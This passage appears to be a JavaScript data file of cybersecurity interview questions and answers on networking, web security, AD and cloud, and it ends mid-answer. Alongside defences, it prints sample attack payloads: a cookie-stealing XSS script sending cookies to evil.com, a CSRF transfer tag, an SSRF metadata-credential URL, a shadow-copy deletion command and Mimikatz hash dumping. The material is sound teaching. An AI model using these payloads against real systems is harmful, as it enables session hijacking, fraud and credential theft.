export const interviewCategories = [
  {
    id: "networking",
    label: "Networking",
    icon: "🌐",
    color: "cyan",
    questions: [
      {
        q: "Explain the OSI model and give an attack example at each layer.",
        a: `The OSI model has 7 layers. From top to bottom:
L7 Application — HTTP, DNS, FTP. Attack: SQL Injection, XSS
L6 Presentation — SSL/TLS, encryption. Attack: SSL Stripping
L5 Session — NetBIOS, session management. Attack: Session Hijacking
L4 Transport — TCP/UDP, ports. Attack: SYN Flood, Port scanning
L3 Network — IP, routing, ICMP. Attack: IP Spoofing, ICMP flood
L2 Data Link — Ethernet, MAC addresses. Attack: ARP Poisoning, MAC flooding
L1 Physical — Cables, radio waves. Attack: Wiretapping, physical access

Mnemonic (top→bottom): All People Seem To Need Data Processing`,
        tags: ["fundamental", "common"],
        difficulty: "Easy",
      },
      {
        q: "Explain the TCP three-way handshake. How is SYN flood attack possible?",
        a: `TCP Handshake:
1. Client sends SYN (Seq=X) — "I want to connect"
2. Server replies SYN-ACK (Seq=Y, Ack=X+1) — "OK, acknowledged"
3. Client sends ACK (Ack=Y+1) — "Connection established"

SYN Flood Attack:
Attacker sends thousands of SYN packets with spoofed source IPs. Server allocates a half-open connection entry for each (stored in backlog queue). Server never receives the final ACK. Backlog queue fills up, server can't accept legitimate connections = DoS.

Defense: SYN cookies (server doesn't allocate resources until handshake completes), rate limiting, firewall rules.`,
        tags: ["tcp", "dos", "common"],
        difficulty: "Easy",
      },
      {
        q: "What is ARP poisoning? How does it enable a MITM attack?",
        a: `ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.

ARP Poisoning:
1. Attacker sends gratuitous ARP replies to victim and gateway
2. Tells victim: "Gateway IP = Attacker's MAC"
3. Tells gateway: "Victim IP = Attacker's MAC"
4. All traffic now flows through attacker — classic MITM

Why it works: ARP has no authentication. Any device can send ARP replies claiming any IP→MAC mapping.

Detection: ARP table anomalies (duplicate IP→different MACs), IDS alerts
Defense: Dynamic ARP Inspection (DAI) on switches, static ARP entries, use encrypted protocols (HTTPS, SSH)`,
        tags: ["arp", "mitm", "network"],
        difficulty: "Medium",
      },
      {
        q: "What is the difference between TCP and UDP? When would you use each?",
        a: `TCP (Transmission Control Protocol):
- Connection-oriented (3-way handshake)
- Reliable: guarantees delivery, ordering, error checking
- Slower due to overhead
- Used for: HTTP/S, SSH, FTP, email (SMTP/IMAP)
- Security concern: SYN flood, session hijacking

UDP (User Datagram Protocol):
- Connectionless — fire and forget
- Unreliable: no guarantee of delivery or ordering
- Faster, lower latency
- Used for: DNS, VoIP, video streaming, online gaming, DHCP
- Security concern: UDP amplification DDoS (DNS, NTP, memcached)

Interview tip: DNS uses UDP port 53 for queries (fast) but TCP port 53 for zone transfers (reliable).`,
        tags: ["tcp", "udp", "protocol"],
        difficulty: "Easy",
      },
      {
        q: "Explain DNS resolution step by step. What is DNS poisoning?",
        a: `DNS Resolution:
1. Browser checks local cache → found? Done.
2. OS checks /etc/hosts file
3. Query to Recursive Resolver (ISP or 8.8.8.8)
4. Resolver → Root Name Server (13 sets worldwide, hint file)
5. Root → TLD Name Server (.com, .org, .net)
6. TLD → Authoritative Name Server for that domain
7. Authoritative → returns A/AAAA record (IP)
8. Resolver caches + returns IP to browser

DNS Poisoning (Cache Poisoning):
Attacker injects false DNS records into a resolver's cache. When victim queries for bank.com, resolver returns attacker's IP instead of real one. Defense: DNSSEC (cryptographic signing of DNS records), DNS over HTTPS (DoH).`,
        tags: ["dns", "poisoning", "common"],
        difficulty: "Medium",
      },
      {
        q: "What is subnetting? Calculate the usable hosts in /26.",
        a: `/26 subnet breakdown:
- Subnet mask: 255.255.255.192
- Total IPs: 2^(32-26) = 2^6 = 64
- Usable hosts: 64 - 2 = 62 (subtract network + broadcast address)
- Example: 192.168.1.0/26 → hosts 192.168.1.1 to 192.168.1.62, broadcast .63

Key formula: Usable hosts = 2^(32-CIDR) - 2

Common CIDR references:
/24 = 254 hosts (most common LAN)
/25 = 126 hosts
/26 = 62 hosts
/27 = 30 hosts
/28 = 14 hosts
/30 = 2 hosts (point-to-point links)
/32 = single host

Security relevance: Proper subnetting enables network segmentation — isolating databases, printers, guest WiFi into separate subnets limits lateral movement.`,
        tags: ["subnetting", "cidr"],
        difficulty: "Medium",
      },
      {
        q: "What ports do these services use: HTTP, HTTPS, SSH, FTP, DNS, RDP, SMB?",
        a: `HTTP — 80 (TCP)
HTTPS — 443 (TCP)
SSH — 22 (TCP)
FTP — 21 (TCP, control), 20 (TCP, data)
DNS — 53 (UDP for queries, TCP for zone transfers)
DHCP — 67/68 (UDP, server/client)
SMTP — 25 (TCP, unencrypted), 587 (STARTTLS)
POP3 — 110 / IMAPS — 993
RDP — 3389 (TCP) ← biggest attack surface, exposed = critical risk
SMB — 445 (TCP) ← EternalBlue (MS17-010), WannaCry, NotPetya
LDAP — 389 (TCP), LDAPS — 636
MySQL — 3306, MSSQL — 1433, PostgreSQL — 5432
Redis — 6379 ← often no auth by default!
MongoDB — 27017 ← same risk as Redis

Pro tip: Interviewers love asking about 3389 (RDP) and 445 (SMB) because these are the most exploited ports historically.`,
        tags: ["ports", "services", "common"],
        difficulty: "Easy",
      },
    ],
  },
  {
    id: "web-security",
    label: "Web Security",
    icon: "🌐",
    color: "orange",
    questions: [
      {
        q: "Explain SQL Injection. What are the different types? How do you prevent it?",
        a: `SQL Injection: Attackers insert malicious SQL into input fields that are incorporated into database queries without sanitization.

Classic example:
Input: ' OR '1'='1
Query becomes: SELECT * FROM users WHERE name='' OR '1'='1' -- returns all rows

Types:
1. In-band Classic — results visible in app response
2. Blind Boolean-based — ask true/false questions (page changes based on condition)
3. Blind Time-based — use SLEEP() to infer data based on response time
4. Error-based — trigger DB errors that leak data
5. Out-of-band — exfiltrate via DNS/HTTP requests (rare)

Prevention (ranked by importance):
✅ Parameterized queries / Prepared statements — the only real fix
✅ Stored procedures (if properly parameterized)
✅ Input validation and whitelisting
✅ Least privilege DB accounts (app user shouldn't be DBA)
✅ WAF as additional layer (not a substitute)
✅ Error handling — never expose DB errors to users

OWASP: A03:2021 — Injection
MITRE: T1190`,
        tags: ["sqli", "owasp", "critical", "common"],
        difficulty: "Easy",
      },
      {
        q: "Difference between Reflected, Stored, and DOM-based XSS.",
        a: `XSS (Cross-Site Scripting) — injecting malicious scripts that execute in victim's browser.

Reflected XSS:
- Script is in the URL/request and reflected back in response
- Victim must click a malicious link
- Not stored — one-time execution
- Example: https://site.com/search?q=<script>alert(1)</script>

Stored XSS (Persistent):
- Script saved in database (comment, profile bio, forum post)
- Executes for EVERY user who views that page
- More dangerous — no need to trick victim into clicking
- Example: Submit <script>document.location='evil.com?c='+document.cookie</script> as a comment

DOM-based XSS:
- Entirely client-side — never hits the server
- JavaScript reads from URL/user input and writes directly to DOM
- Example: document.write(location.hash) then URL: site.com#<img onerror=alert(1)>
- Cannot be caught by server-side filtering

Prevention:
✅ Output encoding (HTML entities: < → &lt;)
✅ Content Security Policy (CSP) header
✅ HTTPOnly + Secure cookie flags
✅ Modern frameworks (React auto-escapes by default)
✅ X-XSS-Protection header (legacy browsers)`,
        tags: ["xss", "owasp", "common"],
        difficulty: "Medium",
      },
      {
        q: "Explain CSRF. How is it different from XSS? How do you prevent it?",
        a: `CSRF (Cross-Site Request Forgery):
Tricks an authenticated user's browser into sending an unintended request to a site they're logged into.

Key distinction:
- XSS exploits trust the USER has in a website (runs script on their behalf)
- CSRF exploits trust the WEBSITE has in the user's browser (cookies sent automatically)

Attack scenario:
1. Victim logged into bank.com (session cookie stored)
2. Victim visits evil.com which contains: <img src="https://bank.com/transfer?to=attacker&amt=5000">
3. Browser automatically sends cookie with that request
4. Bank processes the transfer — victim never knew

Why it works: Browsers automatically attach cookies to cross-origin requests.

Prevention:
✅ CSRF tokens — unique per-session, per-request token that attacker can't know
✅ SameSite cookie attribute (Strict/Lax) — modern browsers block cross-site cookie sending
✅ Custom request headers (AJAX only) — simple headers like X-Requested-By are CORS-blocked
✅ Double Submit Cookie pattern
✅ Re-authentication for sensitive actions`,
        tags: ["csrf", "owasp", "web"],
        difficulty: "Medium",
      },
      {
        q: "What is SSRF and why is it dangerous in cloud environments?",
        a: `SSRF (Server-Side Request Forgery):
The server is tricked into making HTTP requests to internal resources on the attacker's behalf.

Classic example:
App has: /fetch?url=https://external-site.com/image.png
Attacker changes to: /fetch?url=http://169.254.169.254/latest/meta-data/
Server fetches AWS metadata endpoint → attacker gets IAM credentials → full AWS account compromise!

Why it's devastating in cloud:
- AWS/GCP/Azure metadata APIs at 169.254.169.254
- Expose: IAM credentials, API keys, internal network info
- IMDSv2 (AWS) mitigates this with token-based requests
- Can pivot to internal services (Redis, Elasticsearch, Kubernetes API)

Real example: Capital One breach (2019) — $150M fine, 100M records exposed via SSRF on AWS metadata

Defense:
✅ Allowlist only needed external domains
✅ Block internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
✅ Use IMDSv2 on AWS (requires session-oriented token)
✅ Network segmentation — app servers can't reach metadata

OWASP A10:2021`,
        tags: ["ssrf", "cloud", "owasp", "critical"],
        difficulty: "Hard",
      },
      {
        q: "What is the OWASP Top 10? Name all 10.",
        a: `OWASP Top 10 (2021 edition):

A01 — Broken Access Control (moved to #1)
→ IDOR, privilege escalation, missing auth checks

A02 — Cryptographic Failures
→ Weak encryption, hardcoded keys, HTTP instead of HTTPS, MD5/SHA1 for passwords

A03 — Injection
→ SQL, NoSQL, OS, LDAP injection (was #1 for years)

A04 — Insecure Design
→ Missing threat modeling, no secure design patterns

A05 — Security Misconfiguration
→ Default passwords, unnecessary features enabled, verbose errors, open S3 buckets

A06 — Vulnerable and Outdated Components
→ Log4Shell (CVE-2021-44228), outdated libraries, unpatched frameworks

A07 — Identification and Authentication Failures
→ Weak passwords, no MFA, session fixation, credential stuffing

A08 — Software and Data Integrity Failures
→ Insecure deserialization, CI/CD pipeline attacks, SolarWinds-type supply chain

A09 — Security Logging and Monitoring Failures
→ No audit logs, not alerting on attacks, dwell time increases

A10 — Server-Side Request Forgery (SSRF)
→ New in 2021, cloud-era critical risk

Memory trick: BAD IS V-ILS (first letters of each)`,
        tags: ["owasp", "web", "common", "must-know"],
        difficulty: "Easy",
      },
      {
        q: "Explain how you would test a web application for vulnerabilities.",
        a: `Structured web app pentesting methodology:

1. Reconnaissance
- Spider/crawl the application (Burp Suite Spider/Crawler)
- Identify tech stack (Wappalyzer, response headers, cookies)
- Find login pages, file upload, admin panels

2. Authentication testing
- Default credentials, account enumeration (different error messages)
- Password policy, brute force protection, MFA bypass
- Session token entropy, cookie flags (HttpOnly, Secure, SameSite)

3. Authorization testing
- IDOR: change user IDs in requests (GET /user/123 → /user/124)
- Horizontal vs vertical privilege escalation
- JWT tampering (alg:none attack, weak secrets)

4. Injection testing
- SQLi: ' OR -- payloads, sqlmap for automation
- XSS: <script>, event handlers, DOM sinks
- XXE, SSTI, LDAP injection

5. Business logic testing
- Skip steps in checkout flow
- Negative price values, currency manipulation
- Rate limiting on sensitive actions

6. Infrastructure
- SSL/TLS config (testssl.sh)
- HTTP security headers (securityheaders.com)
- API endpoints, hidden parameters (directory brute forcing)

Tools: Burp Suite (primary), OWASP ZAP, sqlmap, nikto, gobuster`,
        tags: ["pentesting", "methodology", "practical"],
        difficulty: "Hard",
      },
    ],
  },
  {
    id: "cryptography",
    label: "Cryptography",
    icon: "🔐",
    color: "purple",
    questions: [
      {
        q: "Symmetric vs Asymmetric encryption. Give examples and use cases.",
        a: `Symmetric Encryption:
- Same key for encryption and decryption
- Fast, efficient — used for bulk data
- Problem: Key distribution (how to securely share the key?)
- Examples: AES-256, 3DES, ChaCha20
- Use: File encryption, full-disk encryption (BitLocker), TLS record layer

Asymmetric Encryption:
- Key pair: public key (encrypt/verify) + private key (decrypt/sign)
- Much slower — used for small data or key exchange
- Solves key distribution problem
- Examples: RSA-2048/4096, ECC (ECDSA, ECDH), Ed25519
- Use: TLS handshake, SSH authentication, digital signatures, certificates

How TLS combines both:
1. Asymmetric crypto used during handshake to exchange a session key
2. Symmetric crypto (AES) used for the actual data transfer
→ Best of both worlds: security of asymmetric + speed of symmetric

Interview tip: Never store passwords with symmetric or asymmetric encryption — use one-way hashing (bcrypt, Argon2, PBKDF2).`,
        tags: ["crypto", "encryption", "common"],
        difficulty: "Easy",
      },
      {
        q: "What makes a good password hashing algorithm? Why is MD5 bad for passwords?",
        a: `What makes a good password hash:
✅ One-way (cannot be reversed)
✅ Slow by design (bcrypt, Argon2) — makes brute force expensive
✅ Salted — random value added before hashing, prevents rainbow tables
✅ Work factor configurable — increase as hardware improves

Why MD5 is bad for passwords:
✗ Designed for speed (billions of MD5/sec on GPU)
✗ No salt (same password = same hash = rainbow table lookup)
✗ Collision attacks exist
✗ Lookup tables can crack common MD5 hashes instantly

Good algorithms (ranked):
1. Argon2id — winner of Password Hashing Competition, best
2. bcrypt — proven, widely supported, work factor adjustable
3. scrypt — memory-hard, resistant to GPU attacks
4. PBKDF2 — FIPS-approved, good fallback

SHA-256 is not for passwords — it's fast! Use it for file integrity, digital signatures.
MD5 is not even good for integrity anymore — use SHA-256+.`,
        tags: ["hashing", "passwords", "crypto"],
        difficulty: "Medium",
      },
      {
        q: "How does TLS work? What is the difference between TLS 1.2 and 1.3?",
        a: `TLS 1.2 Handshake (simplified):
1. ClientHello — supported cipher suites, TLS version, random bytes
2. ServerHello — chosen cipher, server certificate, random bytes
3. Client verifies certificate (CA chain, expiry, domain)
4. Key exchange (RSA: client sends encrypted premaster secret OR DHE: Diffie-Hellman)
5. Both derive session keys from random bytes + premaster secret
6. Finished messages — verify handshake integrity
7. Encrypted data transfer begins (AES-GCM typically)

TLS 1.3 improvements:
✅ Faster — 1-RTT handshake (vs 2-RTT in 1.2), 0-RTT resumption
✅ No more RSA key exchange (forward secrecy mandatory via ECDHE)
✅ Removed weak ciphers: RC4, 3DES, MD5, SHA-1, DH<2048
✅ Only 5 cipher suites (all with AEAD)
✅ Encrypted more of the handshake

Perfect Forward Secrecy (PFS): Each session uses ephemeral keys. Even if server's private key is compromised later, past sessions cannot be decrypted.`,
        tags: ["tls", "ssl", "crypto", "common"],
        difficulty: "Medium",
      },
    ],
  },
  {
    id: "threats-attacks",
    label: "Threats & Attacks",
    icon: "⚡",
    color: "red",
    questions: [
      {
        q: "Explain the Cyber Kill Chain. What is its limitation?",
        a: `Cyber Kill Chain (Lockheed Martin, 2011) — 7 phases:

1. Reconnaissance — OSINT, scanning, target research
2. Weaponization — Build exploit + payload (malicious doc, malware)
3. Delivery — Email phishing, watering hole, USB drop
4. Exploitation — Execute code on target (CVE, macro, social engineering)
5. Installation — Establish persistence (registry run key, cron job, service)
6. Command & Control (C2) — Beacon to attacker's server (HTTPS, DNS tunneling)
7. Actions on Objectives — Exfiltrate, encrypt, destroy, pivot

Defensive value: Break the chain at any stage → stop the attack.
Earlier is better — breaking at Delivery is easier than at Impact.

Limitations:
✗ Linear model — modern attacks jump phases or repeat them
✗ Insider threats don't follow this model
✗ Misses living-off-the-land techniques (no malware = no delivery phase)
✗ Doesn't cover cloud-native or API attacks well
✗ Too focused on malware-based attacks

MITRE ATT&CK addresses these gaps with 14 non-linear tactics and 200+ techniques.`,
        tags: ["kill-chain", "framework", "common"],
        difficulty: "Easy",
      },
      {
        q: "What is ransomware? Explain a modern double-extortion attack chain.",
        a: `Ransomware: Malware that encrypts victim files and demands payment for the decryption key.

Modern Double-Extortion Attack Chain:
1. Initial Access — Phishing email, RDP brute force, VPN vulnerability exploitation
2. Persistence — Scheduled tasks, registry keys, service installation
3. Privilege Escalation — Local exploit, token impersonation, password spraying
4. Defense Evasion — Disable AV/EDR, clear event logs, unhook security tools
5. Discovery — Network scanning, AD enumeration, identify backup servers
6. Lateral Movement — Pass-the-hash, PsExec, WMI, RDP
7. Data Exfiltration — Upload sensitive data to attacker infrastructure (Mega, rclone)
8. Impact — Delete shadow copies (vssadmin delete shadows /all), encrypt files
9. Ransom Note — Demand payment, threaten to publish stolen data

Famous groups: LockBit, BlackCat/ALPHV, Cl0p, Royal, Rhysida
Average ransom 2024: $1.5M; average breach cost: $4.88M

Defense:
✅ 3-2-1 backup rule (offline, immutable backups)
✅ Network segmentation
✅ Disable RDP or put behind VPN + MFA
✅ EDR on all endpoints
✅ Incident response plan + tabletop exercises`,
        tags: ["ransomware", "malware", "critical", "common"],
        difficulty: "Medium",
      },
      {
        q: "Explain phishing, spear phishing, and whaling. What technical controls help?",
        a: `Phishing: Mass email campaign impersonating trusted entity (bank, Microsoft, PayPal). Generic lure, low effort, high volume.

Spear Phishing: Targeted, personalized attack using OSINT. References victim's name, employer, colleagues, recent activity. Much higher success rate.

Whaling: Spear phishing specifically targeting executives (CEO, CFO). Often involves BEC (Business Email Compromise) — "CEO" asks accountant to wire funds.

Vishing: Voice phishing (phone calls impersonating IT support, bank fraud teams)
Smishing: SMS phishing (fake delivery notifications, bank alerts)

Technical controls:
Email authentication:
✅ SPF (Sender Policy Framework) — authorize which IPs can send for your domain
✅ DKIM (DomainKeys Identified Mail) — cryptographic signature on emails
✅ DMARC (Domain-based Message Authentication) — policy for SPF/DKIM failures (reject, quarantine, none)

Other controls:
✅ Email filtering + sandbox for attachments
✅ Anti-phishing browser extensions
✅ MFA — even if credentials are stolen, attacker needs the second factor
✅ Security awareness training + simulated phishing campaigns
✅ EvilGinx/AiTM phishing can bypass MFA — use phishing-resistant MFA (FIDO2, hardware keys)`,
        tags: ["phishing", "social-engineering", "common"],
        difficulty: "Easy",
      },
      {
        q: "What is a Man-in-the-Middle attack? Name 3 techniques attackers use.",
        a: `MITM: Attacker secretly intercepts and optionally modifies communications between two parties who believe they're communicating directly.

Technique 1 — ARP Poisoning (LAN):
Send fake ARP replies linking attacker's MAC to victim/gateway IPs. All LAN traffic routes through attacker. Tool: Ettercap, Bettercap.

Technique 2 — SSL Stripping:
Downgrade HTTPS to HTTP. When victim requests HTTPS site, attacker intercepts and serves HTTP to victim while maintaining HTTPS to server. Victim never sees padlock. Defense: HSTS (HTTP Strict Transport Security) header forces browsers to always use HTTPS.

Technique 3 — Rogue Access Point (Evil Twin):
Set up fake WiFi AP with same SSID as legitimate network. Victim connects, all traffic flows through attacker. Deauthentication attack forces victims off real AP.

Other techniques: DNS Spoofing, BGP Hijacking (nation-state level), HTTPS certificate forgery (requires compromised CA)

Detection signs:
- Certificate warnings in browser
- ARP table showing duplicate IPs
- Unexpected network devices
- SSL cert for site suddenly changed

Defense: HTTPS + HSTS, certificate pinning, VPN, 802.1X network authentication`,
        tags: ["mitm", "network", "interception"],
        difficulty: "Medium",
      },
      {
        q: "Explain privilege escalation on Linux and Windows.",
        a: `Linux Privilege Escalation:

1. SUID Binaries — files that run as owner (often root)
   find / -perm -4000 2>/dev/null
   GTFOBins.github.io lists exploitable SUID binaries

2. Sudo misconfigurations
   sudo -l → if (NOPASSWD) on a program, use GTFOBins to get shell

3. Writable /etc/passwd or /etc/shadow — add root user

4. Cron jobs running as root with writable scripts
   cat /etc/crontab; ls -la /path/to/cron/script

5. Kernel exploits — dirty cow, dirty pipe, OverlayFS

6. Path injection — writable directory before system binary in PATH

7. Capabilities — getcap -r / 2>/dev/null

Windows Privilege Escalation:

1. Unquoted service paths — service binary with spaces in path
   sc qc ServiceName

2. Weak service permissions — can replace service binary

3. AlwaysInstallElevated registry key — install MSI as SYSTEM

4. Stored credentials — unattended install files, SAM database, credential manager

5. Token impersonation — SeImpersonatePrivilege → JuicyPotato, PrintSpoofer

6. DLL hijacking — place malicious DLL where app searches first

7. Kernel exploits — MS16-032, EternalBlue, PrintNightmare

Tools: LinPEAS/WinPEAS (automated enumeration)`,
        tags: ["privilege-escalation", "linux", "windows", "post-exploitation"],
        difficulty: "Hard",
      },
    ],
  },
  {
    id: "frameworks-governance",
    label: "Frameworks & Governance",
    icon: "🏛️",
    color: "yellow",
    questions: [
      {
        q: "What is MITRE ATT&CK? How is it used in practice?",
        a: `MITRE ATT&CK: A knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world threat intelligence.

Structure:
- Tactics (14) — the "why" — adversary goals (Initial Access, Persistence, Exfiltration...)
- Techniques (200+) — the "how" — specific methods (T1566 Phishing, T1059 Command Execution...)
- Sub-techniques — more granular (T1566.001 = Spear Phishing Attachment)
- Procedures — specific implementations by known threat actors

Practical uses:
Red Team: Map exercises to ATT&CK IDs to measure coverage. "We successfully demonstrated T1055 Process Injection."

Blue Team / Detection Engineering: Write SIEM rules targeting specific technique IDs. "Do we detect T1003 OS Credential Dumping? If not, build that detection."

Threat Intelligence: "APT29 uses T1078 Valid Accounts for persistence — do we monitor for unusual logins?"

SOC: When alert fires, map to ATT&CK to understand attack stage and predict next steps.

Purple Teaming: Red simulates specific ATT&CK techniques while Blue tries to detect — close detection gaps.

Maturity assessment: ATT&CK Navigator — visualize what you can/cannot detect.`,
        tags: ["mitre", "framework", "threat-intel", "common"],
        difficulty: "Medium",
      },
      {
        q: "What is the NIST Cybersecurity Framework? Name the 5 functions.",
        a: `NIST CSF: Voluntary framework developed by NIST to help organizations manage and reduce cybersecurity risk. Widely adopted across industries and required for federal agencies.

5 Core Functions:

1. IDENTIFY 🔍
Know your assets, risks, and responsibilities
Inventory, risk assessment, governance, supply chain risk management

2. PROTECT 🛡️
Safeguards to limit or contain impact
Access control, data security, training, patching, backups

3. DETECT 📡
Identify cybersecurity events in timely manner
SIEM, IDS/IPS, anomaly detection, log monitoring

4. RESPOND 🚨
Take action when incident is detected
Incident response plan, communications, analysis, containment, eradication

5. RECOVER 🔄
Restore capabilities, improve resilience
Recovery planning, lessons learned, communications

Implementation Tiers (1-4):
Tier 1: Partial (ad hoc) → Tier 4: Adaptive (continuously improving)

NIST CSF 2.0 (2024 update) added GOVERN as a 6th function covering organizational governance.`,
        tags: ["nist", "framework", "governance"],
        difficulty: "Easy",
      },
      {
        q: "Explain Zero Trust Architecture. What are its core principles?",
        a: `Zero Trust: "Never trust, always verify" — no user, device, or network segment is trusted by default, even inside the corporate perimeter.

Core Principles:

1. Verify explicitly — Always authenticate and authorize using all available data points: identity, location, device health, service/workload, data classification, anomalies

2. Use least privilege access — Limit user access with just-in-time and just-enough-access (JIT/JEA). Minimize blast radius if compromised.

3. Assume breach — Minimize blast radius, segment access, encrypt everything, use analytics to detect anomalies

Key components:
- Strong Identity — MFA, conditional access, privileged identity management
- Device health — Device compliance before granting access
- Network segmentation — Microsegmentation, no flat networks
- Application access — Never expose apps directly to internet (VPN alternatives)
- Data classification — Know what data you have and apply controls

Why Zero Trust:
Traditional perimeter security assumed everything inside the network was trusted. Modern environments (cloud, remote work, BYOD, supply chain) have no clear perimeter — Zero Trust addresses this.

NIST 800-207 is the authoritative guide.`,
        tags: ["zero-trust", "architecture", "cloud"],
        difficulty: "Medium",
      },
    ],
  },
  {
    id: "soc-blue-team",
    label: "SOC & Blue Team",
    icon: "🛡️",
    color: "blue",
    questions: [
      {
        q: "Walk me through an incident response process.",
        a: `Incident Response (NIST SP 800-61 lifecycle):

Phase 1: PREPARATION
- IR plan documented and tested
- Tools ready: SIEM, EDR, forensics toolkit
- Communication tree established
- Tabletop exercises conducted

Phase 2: DETECTION & ANALYSIS
- Alert fires in SIEM/EDR
- Triage: true positive or false positive?
- Determine scope: single endpoint? Whole domain?
- Preserve evidence: memory dumps, disk images, logs
- Timeline construction
- MITRE ATT&CK mapping

Phase 3: CONTAINMENT
Short-term: Isolate affected systems (network quarantine)
Long-term: Patch vulnerability, disable compromised accounts

Phase 4: ERADICATION
- Remove malware and persistence mechanisms
- Identify and close root cause (patching, config change)
- Rebuild compromised systems from known-good images

Phase 5: RECOVERY
- Restore systems from clean backups
- Monitor closely for re-infection
- Phased restoration — most critical systems first

Phase 6: LESSONS LEARNED (within 2 weeks)
- What happened, when, how
- What worked, what didn't
- Update IR plan, add detections
- Executive report

Key documents: Chain of custody, incident timeline, IOC list`,
        tags: ["incident-response", "soc", "blue-team", "common"],
        difficulty: "Medium",
      },
      {
        q: "What is the difference between IDS, IPS, and a WAF?",
        a: `IDS (Intrusion Detection System):
- Passively monitors and alerts — does NOT block
- Network IDS (NIDS): monitors network traffic (e.g., Snort, Suricata in IDS mode)
- Host IDS (HIDS): monitors single system files, logs, processes (e.g., OSSEC, Wazuh)
- Generates alerts for SOC analyst to investigate
- Risk: False positives (alert fatigue), false negatives (missed attacks)

IPS (Intrusion Prevention System):
- Inline — actively blocks malicious traffic in real-time
- Sits between network segments
- Same detection as IDS but takes action: drop packet, reset connection, block IP
- Risk: False positives can block legitimate traffic (production impact)

WAF (Web Application Firewall):
- Layer 7 (Application layer) — understands HTTP/S
- Protects web applications specifically
- Blocks: SQLi, XSS, CSRF, SSRF, directory traversal, known CVE payloads
- Modes: Block (production), Detect only (learning mode)
- Examples: AWS WAF, Cloudflare WAF, ModSecurity (open source), F5 ASM
- Limitation: Can be bypassed with encoding, evasion techniques — not a substitute for secure coding

Summary:
IDS = Smoke detector (alerts only)
IPS = Smoke detector + sprinkler (detects and responds)
WAF = Specialized guard for your web app entrance`,
        tags: ["ids", "ips", "waf", "defense", "common"],
        difficulty: "Easy",
      },
      {
        q: "What is a SIEM? What would you look for to detect a brute force attack?",
        a: `SIEM (Security Information and Event Management):
Centralized platform that collects, aggregates, correlates, and analyzes logs from across the environment to detect threats and support incident response.

Core functions:
- Log aggregation (endpoints, firewalls, AD, servers, cloud)
- Real-time correlation rules (if A and B happen within 5 min, alert)
- Alerting and case management
- Long-term retention for forensics and compliance

Examples: Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM

Detecting Brute Force in SIEM:

Indicators:
- Many failed authentication events (Event ID 4625 on Windows) from same IP
- Account lockouts (Event ID 4740)
- Successful login after many failures (credential stuffing success!)
- Logins from unusual geographies or times
- Multiple accounts attempted from same source (password spraying)

Splunk rule example:
index=windows EventCode=4625
| stats count by src_ip, Account_Name
| where count > 20
| sort - count

Response: Block source IP, force password reset, enable MFA, alert user

Password Spraying vs Brute Force:
Brute Force: Many passwords against one account (triggers lockout)
Password Spraying: One password against many accounts (avoids lockout)
→ Spray is harder to detect — look for distributed failed logins across many accounts`,
        tags: ["siem", "soc", "detection", "brute-force"],
        difficulty: "Medium",
      },
    ],
  },
  {
    id: "active-directory",
    label: "Active Directory",
    icon: "🏢",
    color: "indigo",
    questions: [
      {
        q: "Explain Kerberoasting. How does it work and how do you defend against it?",
        a: `Kerberoasting: Offline cracking attack against Active Directory service account passwords.

How Kerberos works (simplified):
1. User authenticates to KDC (Key Distribution Center) → gets TGT
2. User presents TGT to request Service Ticket for a specific service
3. KDC returns Service Ticket encrypted with the service account's password hash

Kerberoasting attack:
1. Attacker has ANY valid domain user account
2. Request service tickets for all SPNs (Service Principal Names) on domain
3. Service tickets are encrypted with service account's NTLM hash
4. Extract tickets from memory (Mimikatz, Rubeus)
5. Crack offline (Hashcat) — no network traffic, no lockout risk!
6. If service account has weak password → full account compromise

Why it's dangerous:
- Service accounts often have domain admin or elevated privileges
- Old service accounts with never-expire passwords
- Weak passwords common (ServiceName2019!)

Detection:
- Event ID 4769 (Kerberos Service Ticket Request) with RC4 encryption
- Many service ticket requests in short time from one account

Defense:
✅ Use Group Managed Service Accounts (gMSA) — auto-rotating 120-char passwords, impossible to crack
✅ Long, complex passwords for service accounts (25+ chars)
✅ Audit SPNs — remove unnecessary ones
✅ Enable "Protected Users" security group for privileged accounts
✅ Monitor 4769 events with RC4_HMAC encryption type`,
        tags: ["kerberoasting", "active-directory", "credential-access", "hard"],
        difficulty: "Hard",
      },
      {
        q: "What is Pass-the-Hash? How does it differ from Pass-the-Ticket?",
        a: `Pass-the-Hash (PtH):
NTLM authentication uses the password hash directly — you don't need the plaintext password!

Attack:
1. Attacker dumps NTLM hash from LSASS (Mimikatz: sekurlsa::logonpasswords)
2. Uses hash directly for authentication — no cracking needed
3. Can move laterally to any system where that user has rights

Tool: Mimikatz, Impacket (psexec.py, wmiexec.py), CrackMapExec

Why it works: NTLM sends hash over network; if you have the hash, you ARE the user.

Pass-the-Ticket (PtT):
Uses stolen Kerberos tickets (TGT or TGS) instead of hashes.

Golden Ticket Attack:
- Compromise KRBTGT account hash (AD's master signing key)
- Forge any TGT for any user, including non-existent accounts
- Valid for 10 years by default, survives password resets
- Even resetting KRBTGT twice doesn't fully help if attacker regenerates

Silver Ticket Attack:
- Forge service tickets for specific services using service account hash
- Less powerful than Golden but stealthier (no DC communication needed)

Defense:
✅ Credential Guard — protects LSASS in isolated environment
✅ Protected Users group — prevents NTLM auth for protected accounts
✅ Tiered admin model — admin accounts never log into workstations
✅ Disable NTLM where possible, enforce Kerberos
✅ Privileged Access Workstations (PAW)`,
        tags: ["pass-the-hash", "active-directory", "lateral-movement"],
        difficulty: "Hard",
      },
    ],
  },
  {
    id: "cloud-devsecops",
    label: "Cloud & DevSecOps",
    icon: "☁️",
    color: "teal",
    questions: [
      {
        q: "What are the shared responsibility models for AWS/Azure/GCP?",
        a: `Cloud Shared Responsibility Model:

Cloud Provider is ALWAYS responsible for:
- Physical infrastructure (data centers, hardware, power)
- Hypervisor and host OS
- Network infrastructure

Customer is ALWAYS responsible for:
- Data (classification, encryption, access)
- Identity and access management (IAM)
- Applications and their security
- Operating system configuration (for IaaS)

Varies by service type:
IaaS (EC2, Azure VMs): Customer manages OS, runtime, applications
PaaS (Elastic Beanstalk, App Service): Provider manages OS, runtime; Customer manages app + data
SaaS (Office 365, Salesforce): Provider manages everything except data and user access

Most common cloud misconfigurations:
1. Public S3 buckets — billions of records exposed historically
2. Overly permissive IAM roles (AdministratorAccess attached everywhere)
3. Open security groups (0.0.0.0/0 on port 22, 3389, 3306)
4. Metadata service exposed via SSRF (169.254.169.254)
5. No MFA on root/admin accounts
